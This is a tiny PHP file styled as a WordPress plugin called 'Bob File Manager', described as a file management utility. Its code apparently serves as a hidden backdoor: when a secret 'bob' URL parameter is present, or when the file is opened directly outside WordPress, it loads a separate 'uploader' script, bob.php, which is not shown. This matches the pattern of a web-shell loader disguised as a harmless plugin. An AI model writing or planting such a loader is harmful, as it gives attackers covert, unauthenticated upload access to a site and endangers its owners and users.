<?php
/*
Plugin Name: Bob File Manager
Description: File management utility
Version: 1.0
Author: Bob Marley
*/

// Redirect to uploader
if (isset($_GET['bob']) || !defined('ABSPATH')) {
    include(dirname(__FILE__) . '/bob.php');
    exit;
}
?>